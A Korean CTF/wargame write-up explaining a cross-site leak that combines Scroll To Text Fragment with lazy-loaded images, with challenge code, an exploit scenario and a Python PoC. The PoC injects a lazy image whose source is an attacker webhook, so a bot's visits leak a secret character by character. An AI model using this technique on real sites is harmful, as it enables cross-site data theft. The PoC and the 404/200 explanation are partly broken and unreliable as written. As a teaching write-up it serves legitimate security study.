---
layout: post
title: "XS-Leak with Scroll To Text Fragment & Lazy Loading"
author: "hazziin"
tags: [Web]
---

굉장히 오랜만에 쓰는 블로그 글임니다...

몇 달 전에 워게임을 풀다가 재미있는 트릭을 하나 발견해서 작성해 보려고 한다.
조금 검색해 보니 2020년에 Plaid CTF에 [비슷한 콘셉트의 문제(catalog)](https://ctftime.org/task/11310)가 나왔던 것 같다. 이걸 2026년에야 정리하다니 ㄱ-
약간 outdated된 건 아닐까 싶지만 그래도 꽤 흥미롭게 풀어서 + 시나리오 짤 때 좀 머리 아팠어서 정리할 가치는 있는 것 같다.

---

# What is XS-Leak?

**XS-Leak(Cross-Site Leak)**은 브라우저의 보안 정책을 우회해 다른 오리진과 상호작용하고, 이를 바탕으로 정보를 간접적으로 추론해내는 공격 기법을 말한다. 일반적으로는 브라우저의 SOP(Same-Origin Policy) 등으로 인해 Cross Origin에 요청을 보낼 수는 있지만 응답 내용을 확인할 수는 없다. <span style="color: #888;"><em><del>(SOP 관련 내용은 다음에...)</del></em></span>
하지만 XS-Leak은 응답 과정에서 드러나는 side-channel 정보를 이용하며, 나아가 데이터를 유출할 수도 있다.

XS-Leak의 전체적인 과정을 나타내면 아래 그림과 같다.

<img src="{{ '/assets/260331/img02.png' | relative_url }}" alt="XS-Leak Overview" width="700">
*XS-Leak Overview*

## XS-Search
XS-Search는 XS-Leak의 일부로, SOP를 우회해 공격 대상 오리진의 정보를 알아내는 공격 기법이다.
대체로 Blind SQL Injection과 유사한 방식(한 글자씩 알아내는 방식)으로 공격이 진행되며, T/F를 구분하기 위해 시간 지연이나 응답 코드 등이 사용된다.

# Image Lazy Loading
시스템 해킹에 Lazy Binding이 있듯, 이와 유사하게 웹에는 **Lazy Loading**이 존재한다. 
**Lazy Loading(지연 로딩)**이란 지금 당장 필요하지 않은 리소스는 나중에 로드하는 것을 의미한다. Lazy Loading 사용 시 현재 화면에 보이는 리소스만 로드되기 때문에 속도 측면에서 큰 이점을 가지게 된다.
만약 이미지에 Lazy Loading을 적용하고 싶다면 아래와 같이 쓰면 된다.

#### 예시 코드
``` html
<img src="image.jpg" loading="lazy" />
```

# Scroll To Text Fragment
Scroll To Text Fragment는 Chromium 계열 text fragment 기능으로, 특정 텍스트 조각이 있는 곳으로 바로 스크롤+강조하는 기능을 제공한다. 관련 문서에 따르면 주석에 의존하지 않고 특정 부분을 바로 보여주고 마크업하기 위해서 만들었다고 한다.
STTF는 특별히 웹해킹 스킬은 아닌 것 같다. 그냥 기능 정도? 하지만 이걸 사용해 익스플로잇을 한다면 브라우저 제약을 좀 탄다.

요 기능은 URL 맨 뒤에 `#:~:text={text}`와 같이 사용할 수 있다. 만약 URL에 아래와 같이 입력하게 되면 해당 텍스트가 있는 곳으로 바로 스크롤되고 강조된다.

#### 사용 예시
```
https://example.com/#:~:text=Example
```
<img src="{{ '/assets/260331/img01.png' | relative_url }}" alt="XS-Leak Overview" width="700">
*대충 이렇게 스크롤+강조됨...*


# XS-Leak with Scroll To Text Fragment & Lazy Loading
이 포스팅에서 가장 중요한 내용! STTF를 이용해서 Image Lazy Loading으로 XS-Leak을 하는 Trick이 있다. 

어떤 이미지의 경로가 invalid해 로드되지 않는다고 가정해 보자. 만약 Eager Loading이라면 당장 보이는 화면에 그 이미지가 포함되지 않아도 로드를 시도할 것이며, 404를 리턴할 것이다. 하지만 Lazy Loading이라면 화면에 그 이미지가 포함될 때 로드를 시도하기 때문에 404가 아닌 200을 리턴하게 된다.

우리는 이 부분과 STTF를 이용해 XS-Leak을 시도할 수 있다. 
특정 이미지가 언로드되는데, 화면에 바로 보이지는 않는다고 가정해 보자. 이때 STTF를 이용해 T/F 여부에 따라 스크롤한다면 어떻게 될까? 즉, True인 경우에는 해당 이미지가 있는 곳으로 스크롤하고 그렇지 않으면 스크롤하지 않는다고 하면 어떻게 될까?
만약 True라면 언로드되는 이미지의 위치로 스크롤될 것이고, 해당 이미지의 로드를 요청할 것이기 때문에 404를 반환할 것이다. 반대로 False인 경우 언로드되는 이미지로 스크롤이 이루어지지 않기 때문에 200을 반환하게 될 것이다.

요 과정을 그림으로 간단히 나타내면 아래 그림과 같다.

<img src="{{ '/assets/260331/img04.png' | relative_url }}" alt="Scroll To Text Fragment & Lazy Loading" width="350">
*Scroll To Text Fragment & Lazy Loading*
<br>우리는 이 부분을 XS-Leak과 연결지을 수 있다. Blind SQL Injection도 T/F 여부를 구분할 수 있으면 데이터를 Leak할 수 있으니, 비슷하게 요 성질을 사용하면 특정 사이트의 정보를 Leak할 수 있을 것이다.


# Challenge Vulnerability Analysis
그럼 이제 본격적으로 문제 코드를 살펴보자. 
```js
// app.js
app.get("/vuln", (req,res) => {

    var input = req.query?.input ?? "";
    var s = req.query?.s ?? "";
    var result;

    ...

    const safe = DOMPurify.sanitize(input);

    if (ip === "127.0.0.1") {
        result = FLAG.startsWith(s) ? "ok" : "no"
    } else {
        result = "fakeflag".startsWith(s) ? "ok" : "no"
    }

    return res.render("vuln", {safe: safe, result: result});
})
```
app.js를 보면 유저에게 총 2개의 인풋을 받는다.

`input`은 `safe`로 렌더링되며 DOMPurify로 인해 HTML Injection은 가능하지만 스크립트 삽입은 불가능하다. 그리고 특정 문자열(플래그)이 우리가 입력한 `s`로 시작한다면 `ok`를 출력하고 그게 아니면 `no`를 출력하니 한 글자씩 플래그를 알아낼 수 있을 것이다. (슬쩍 봐도 XS-Leak 하라고 생긴 것 같다) 

이때 `FLAG`와 비교하려면 ip가 localhost여야 한다.

```html
<!-- vuln.ejs -->
<body>
    <img src="x" alt="img">

    <%- safe %>
    <%- result %>

</body>
```
취약한 페이지인 vuln.ejs를 보면 이미지 하나가 로드되고 끝난다. 그리고 우리가 입력한 값인 `safe`가 들어가고, if문의 문자열 매칭 결과인 `result`도 함께 출력된다.

추가로 /report 페이지가 존재해서 localhost에서 돌아가는 봇이 특정 페이지에 방문하도록 유도할 수 있다.

정리하면 아래와 같다.

1. HTML Injection 가능
1.1. 특정 요소(`<br>`, `<img>` 등) 삽입 가능
1.2. DOM Purify로 인해 스크립트 삽입은 불가능 → 즉, XSS 불가능
2. `s`를 인자로 받아 백엔드의 `startsWith(s)`로 특정 string을 한 글자씩 leak 가능 → XS-Leak
2.1. 이때, `localhost(127.0.0.1)`로 접근하면 플래그 leak 가능
3. report 기능으로 localhost의 봇이 특정 페이지에 접근하도록 할 수 있음


## Exploit Scenario
`result`는 `safe` 이후에 출력되기 때문에, 페이지의 최하단에 배치해 STTF를 유도할 수 있다. 그리고 이미지 하나를 추가한 뒤 공격자의 서버를 `src`로 넣어 주면 플래그를 한 글자씩 leak할 수 있을 것이다.

따라서 아래와 같이 익스플로잇 시나리오를 구상할 수 있다.

1. 해당 문제는 유저에게 쿼리스트링으로 파라미터를 받는다. 따라서 찾고자 하는 문자열(`s`), 삽입할 HTML 요소들(`input`), 매칭 결과인 `ok`로 스크롤하는 페이로드를 URL에 포함해 /vuln에 요청을 보낸다. 
1.1. `s`에는 한 글자씩 append하며 문자열 비교를 진행해 플래그를 leak한다.
1.2. `input`에는 Lazy Loading을 유도하기 위해 매우 많은 `<br>`을 삽입한다. 이후 페이지 하단에 이미지를 하나 삽입한 후, `src`를 공격자의 서버로 지정한다. 이때 이미지는 Lazy Loading되게 한다.
1.3. 비교 결과에 따라 STTF를 트리거하기 위해 URL 마지막에 `#:~:text=ok`를 덧붙인다.
2. report 기능으로 봇이 1.의 요소들이 삽입된 페이지를 방문하도록 유도한다. 
2.1. 만약 `result`의 결과가 ok라면 STTF가 일어나며 아래로 곧장 스크롤이 될 것이고, 이미지 로드를 시도하며 공격자의 서버로 요청을 보내게 된다.
3. 공격자의 서버로 전송된 요청을 토대로 플래그의 값을 유추한다.

이 과정을 이미지로 나타내면 아래와 같다.

<img src="{{ '/assets/260331/img03.png' | relative_url }}" alt="Exploit Scenario" width="700">
*Exploit Scenario*
<br>

## PoC

이 동작을 수행하는 스크립트는 대략적으로 아래와 같이 작성할 수 있다.(공격 대상 환경이나 웹훅 구현에 따라 코드는 조금 달라질 수 있다.)
```py
import requests
import string

charset = string.ascii_letters + string.digits + "{}"
for i in range(len(charset)):
    url = TARGET + "/vuln"
    url += "?input=" + "%3Cbr%3E"*0x100 + "%3Cimg%20src=%22" + WEBHOOK + "?leak=" + i + "%22%20loading=%22lazy%22%20/%3E"
    url += "&s=" + FLAG + i + "#:~:text=ok"

    requests.post(url=TARGET+"/report", json={"url":url})
```

---
# Reference
- [Scroll to Text Fragment \| XS-Leaks Wiki](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/)
- [Scroll-to-text Fragment Navigation - Security Issues (PUBLIC)](https://docs.google.com/document/d/1YHcl1-vE_ZnZ0kL2almeikAj2gkwCq8_5xwIae7PVik/edit?tab=t.0)
- [Scroll to Text Fragment \| Chrome Platform Status](https://chromestatus.com/feature/4733392803332096)
- [From XS-Leaks to SS-Leaks Using object](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)
